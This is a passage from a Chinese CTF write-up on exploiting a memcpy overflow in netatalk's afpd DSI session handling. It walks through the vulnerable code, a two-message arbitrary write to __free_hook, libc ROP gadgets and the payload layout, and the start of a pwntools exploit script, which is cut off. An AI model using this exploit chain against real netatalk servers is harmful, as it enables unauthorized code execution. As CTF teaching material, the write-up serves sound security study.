byte)</code>。程序开发者本意是想拷贝4个字节内容至dsi-&gt;attn_quantum变量，但是由于Payload是可控的，故memcpy长度可由攻击者定义（commands[1]，最大值为255），因此攻击者可以覆盖attn_quantum之后变量的内容（包括datasize，server_quantum，serverID，clientID，*commands和部分的data）。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">pedef <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">uint32_t</span> attn_quantum<span class="token punctuation">,</span> datasize<span class="token punctuation">,</span> server_quantum<span class="token punctuation">;</span>    <span class="token keyword">uint16_t</span> serverID<span class="token punctuation">,</span> clientID<span class="token punctuation">;</span>    <span class="token keyword">uint8_t</span>  <span class="token operator">*</span>commands<span class="token punctuation">;</span> <span class="token comment">/* DSI recieve buffer */</span>    <span class="token keyword">uint8_t</span>  data<span class="token punctuation">[</span>DSI_DATASIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* DSI reply buffer */</span>    size_t   datalen<span class="token punctuation">,</span> cmdlen<span class="token punctuation">;</span>    off_t    read_count<span class="token punctuation">,</span> write_count<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span> DSI<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dsi_opensession</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">uint32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">/* this serves double duty. it must be 4-bytes long */</span>  <span class="token keyword">int</span> offs<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">/* parse options */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/*    * 结合这里的可知 Payload 的内部结构为：    * dsi->commands = 功能码(1 byte) + 数据长度(1 byte) + 数据载荷(n byte)    */</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> DSIOPT_ATTNQUANT<span class="token operator">:</span>      <span class="token comment">// 漏洞点</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>attn_quantum<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dsi<span class="token operator">-></span>attn_quantum <span class="token operator">=</span> <span class="token function">ntohl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>attn_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> DSIOPT_SERVQUANT<span class="token operator">:</span> <span class="token comment">/* just ignore these */</span>    <span class="token keyword">default</span><span class="token operator">:</span>      i <span class="token operator">+=</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">/* forward past length tag + length */</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* let the client know the server quantum. we don't use the   * max server quantum due to a bug in appleshare client 3.8.6. */</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_flags <span class="token operator">=</span> DSIFL_REPLY<span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* dsi->header.dsi_command = DSIFUNC_OPEN;*/</span>  dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* length of data. dsi_send uses it. */</span>  <span class="token comment">/* DSI Option Server Request Quantum */</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> DSIOPT_SERVQUANT<span class="token punctuation">;</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token punctuation">(</span> dsi<span class="token operator">-></span>server_quantum <span class="token operator">&lt;</span> DSI_SERVQUANT_MIN <span class="token operator">||</span>       dsi<span class="token operator">-></span>server_quantum <span class="token operator">></span> DSI_SERVQUANT_MAX <span class="token punctuation">)</span> <span class="token operator">?</span>     DSI_SERVQUANT_DEF <span class="token operator">:</span> dsi<span class="token operator">-></span>server_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>commands <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* AFP replaycache size option */</span>  offs <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>offs<span class="token punctuation">]</span> <span class="token operator">=</span> DSIOPT_REPLCSIZE<span class="token punctuation">;</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>offs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>REPLAYCACHE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>commands <span class="token operator">+</span> offs <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">dsi_send</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们在同一个socket中发送2条DSI消息，实现任意地址写。</p><h4 id="第一条消息"><a href="#第一条消息" class="headerlink" title="第一条消息"></a>第一条消息</h4><p>利用上面提到的memcpy漏洞，将*commands指针覆盖成free_hook的地址。发送第一条消息的DSI数据包的Header由 <code>gen_header(payload_len)</code>生成，Payload格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第二条消息"><a href="#第二条消息" class="headerlink" title="第二条消息"></a>第二条消息</h4><ul><li>afp_over_dsi()(@/etc/afpd/afp_dsi.c)：执行完上面提到的dsi_opensession()函数后，子进程返回至dsi_start()函数，调用afp_over_dsi()函数，该函数负责在当前socket下继续读取消息，并根据消息调用不同的处理函数，实现AFP协议的通信。函数首先调用了 <strong>dsi_stream_receive()</strong> ，从当前socket读取新消息，之后根据消息内容返回DSI header中的dsi_command。根据dsi_command值的不同，走不同的switch分支，其中当dsi_command为DSIFUNC_CMD时，会以commands[0]为index，从afp_switch这个全局的函数数组中选择对应的处理函数，处理commands数据。afp_switch这个全局的变量，在初始时赋值为preauth_switch，其中只包含认证前能访问的函数，在通过认证之后，会变为postauth_switch，可访问认证后的函数。<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">afp_over_dsi</span><span class="token punctuation">(</span>AFPObj <span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    DSI <span class="token operator">*</span>dsi <span class="token operator">=</span> <span class="token punctuation">(</span>DSI <span class="token operator">*</span><span class="token punctuation">)</span> obj<span class="token operator">-></span>dsi<span class="token punctuation">;</span>    <span class="token keyword">int</span> rc_idx<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> err<span class="token punctuation">,</span> cmd<span class="token punctuation">;</span>    <span class="token keyword">uint8_t</span> function<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">/* Blocking read on the network socket */</span>        cmd <span class="token operator">=</span> <span class="token function">dsi_stream_receive</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> DSIFUNC_CLOSE<span class="token operator">:</span>            <span class="token function">LOG</span><span class="token punctuation">(</span>log_debug<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"DSI: close session request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">afp_dsi_close</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">LOG</span><span class="token punctuation">(</span>log_note<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> DSIFUNC_TICKLE<span class="token operator">:</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">case</span> DSIFUNC_CMD<span class="token operator">:</span>            function <span class="token operator">=</span> <span class="token punctuation">(</span>u_char<span class="token punctuation">)</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>afp_switch<span class="token punctuation">[</span>function<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                err <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>afp_switch<span class="token punctuation">[</span>function<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>                                                  <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dsi<span class="token operator">-></span>commands<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">,</span>                                                  <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dsi<span class="token operator">-></span>datalen<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>dsi_stream_receive()(@/libatalk/dsi/dsi_stream.c)：该函数从当前socket继续读取消息并保存在结构体中。具体地，先读取DSI header并保存到dsi-&gt;header结构体中，然后读取后续DSI payload保存到dsi-&gt;commands指向的buffer当中，长度由dsi-&gt;cmdlen指定。<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dsi_stream_receive</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> block<span class="token punctuation">[</span>DSI_BLOCKSIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">LOG</span><span class="token punctuation">(</span>log_maxdebug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: START"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>flags <span class="token operator">&amp;</span> DSI_DISCONNECTED<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* read in the header */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_buffered_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>block<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_flags <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>clientID <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* make sure we don't over-write our buffers. */</span>  dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> <span class="token function">MIN</span><span class="token punctuation">(</span><span class="token function">ntohl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>server_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Receiving DSIWrite data is done in AFP function, not here */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">LOG</span><span class="token punctuation">(</span>log_maxdebug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: write request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* 将header之后的payload读取到commands指向的内存中 */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span> <span class="token operator">!=</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">LOG</span><span class="token punctuation">(</span>log_debug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: DSI cmdlen: %zd"</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>第二条消息最终会由dsi_stream_receive()函数中的 <code>dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;comlen)</code>函数读取到dsi-&gt;commands所指向的内存中（该指针已在第一条消息中被篡改为free_hook，因此此时我们篡改的就是free_hook）。其中dsi-&gt;comlen由DSI数据包中的Total data length指定。第二条消息的DSI数据包的Header也由 <code>gen_header(payload_len)</code>生成，Payload格式如下。在开头再加一个’\x00’是因为afp_over_dsi()函数在执行完dsi_stream_receive()后会进入 <code>case DSIFUNC_CMD</code>，第一个字节用于指定要使用的函数（<code>function = (u_char) dsi-&gt;commands[0]</code>）拿个0去填充即可。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>参考（CV）：<a href="https://gtrboy.github.io/posts/netatalk/">gtrboy</a></p><ol><li><p>setcontext+53：</p><pre class="line-numbers language-none"><code class="language-none">.text:0000000000052070 ; __unwind &#123;.text:0000000000052070                 push    rdi.text:0000000000052071                 lea     rsi, [rdi+128h] ; nset.text:0000000000052078                 xor     edx, edx        ; oset.text:000000000005207A                 mov     edi, 2          ; how.text:000000000005207F                 mov     r10d, 8         ; sigsetsize.text:0000000000052085                 mov     eax, 0Eh.text:000000000005208A                 syscall                 ; LINUX - sys_rt_sigprocmask.text:000000000005208C                 pop     rdi.text:000000000005208D                 cmp     rax, 0FFFFFFFFFFFFF001h.text:0000000000052093                 jnb     short loc_520F0.text:0000000000052095                 mov     rcx, [rdi+0E0h].text:000000000005209C                 fldenv  byte ptr [rcx].text:000000000005209E                 ldmxcsr dword ptr [rdi+1C0h].text:00000000000520A5                 mov     rsp, [rdi+0A0h]; &lt;--- setcontext+53.text:00000000000520AC                 mov     rbx, [rdi+80h].text:00000000000520B3                 mov     rbp, [rdi+78h].text:00000000000520B7                 mov     r12, [rdi+48h].text:00000000000520BB                 mov     r13, [rdi+50h].text:00000000000520BF                 mov     r14, [rdi+58h].text:00000000000520C3                 mov     r15, [rdi+60h].text:00000000000520C7                 mov     rcx, [rdi+0A8h].text:00000000000520CE                 push    rcx.text:00000000000520CF                 mov     rsi, [rdi+70h].text:00000000000520D3                 mov     rdx, [rdi+88h].text:00000000000520DA                 mov     rcx, [rdi+98h].text:00000000000520E1                 mov     r8, [rdi+28h].text:00000000000520E5                 mov     r9, [rdi+30h].text:00000000000520E9                 mov     rdi, [rdi+68h].text:00000000000520E9 ; &#125; &#x2F;&#x2F; starts at 52070.text:00000000000520ED ; __unwind &#123;.text:00000000000520ED                 xor     eax, eax.text:00000000000520EF                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实对照下图可知：这段gadget是根据sigreturn系统调用中的Signal Frame格式在给各个寄存器赋值。由于赋值时是根据rdi寄存器中存放的值作为基址的，故使用这个gadget要求<strong>rdi寄存器</strong>及<strong>rdi指向的内存空间都可控</strong> 。</p><p><a href="https://imgtu.com/i/77bzYn"><img src="https://s4.ax1x.com/2022/01/25/77bzYn.png" alt="Signal Frame"></a></p></li><li><p>libc_dlopen_mode+56：这段gadget首先把_dl_open_hook内的值（并不是_dl_open_hook的地址）赋值给rax，然后以该值1为地址取值2，跳转到值2对应的地址。效果等价于令rip跳转到_dl_open_hook上所保存的地址，并且令rax=_dl_open_hook的地址值。</p><pre class="line-numbers language-none"><code class="language-none">.text:0000000000166450 ; __unwind &#123;.text:0000000000166450                 sub     rsp, 58h.text:0000000000166454                 mov     rax, fs:28h.text:000000000016645D                 mov     [rsp+58h+var_10], rax.text:0000000000166462                 xor     eax, eax.text:0000000000166464                 mov     rax, [rsp+58h].text:0000000000166469                 mov     [rsp+58h+var_38], rdi.text:000000000016646E                 mov     [rsp+58h+var_30], esi.text:0000000000166472                 mov     [rsp+58h+var_28], rax.text:0000000000166477                 mov     rax, cs:_rtld_global_ro_ptr.text:000000000016647E                 cmp     qword ptr [rax+148h], 0.text:0000000000166486                 jnz     short loc_1664B0.text:0000000000166488                 mov     rax, cs:_dl_open_hook; &lt;--- libc_dlopen_mode+56.text:000000000016648F                 call    qword ptr [rax]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>fgetpos64+207</p><pre class="line-numbers language-none"><code class="language-none">mov rdi, rax ; call qword ptr [rax + 0x20]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>布局</p><p><a href="https://imgtu.com/i/77bxFs"><img src="https://s4.ax1x.com/2022/01/25/77bxFs.png" alt="payload布局"></a></p></li></ol><h3 id="爆破基址"><a href="#爆破基址" class="headerlink" title="爆破基址"></a>爆破基址</h3><ol><li><p>先打一次会覆盖DSI结构中的command指针payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>REMOTE <span class="token operator">=</span> <span class="token boolean">False</span>IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">5566</span><span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>    IP <span class="token operator">=</span> <span class="token string">"chall.pwnable.tw"</span>    PORT <span class="token operator">=</span> <span class="token number">10002</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span>    header <span class="token operator">+=</span> <span class="token 